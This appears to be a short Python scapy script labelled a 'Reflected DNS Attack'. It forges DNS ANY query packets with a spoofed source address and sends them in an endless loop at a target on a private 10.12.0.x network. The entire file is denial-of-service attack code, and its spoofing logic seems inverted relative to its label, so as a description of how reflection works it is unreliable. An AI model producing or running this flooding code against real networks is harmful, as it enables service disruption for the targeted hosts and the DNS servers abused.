import scapy.all as scapy
from scapy.layers.inet import IP, TCP, ICMP, UDP
import threading

"""
Reflected DNS Attack
"""

dns_server_ip = '10.12.0.20'
target_ip = '10.12.0.40'

def reflective_dns():


    attack_payload = IP(src=dns_server_ip, dst=target_ip) / UDP(sport=53, dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='example.com', qtype='ANY'))

    scapy.send(attack_payload, verbose=0, loop=1)

reflective_dns()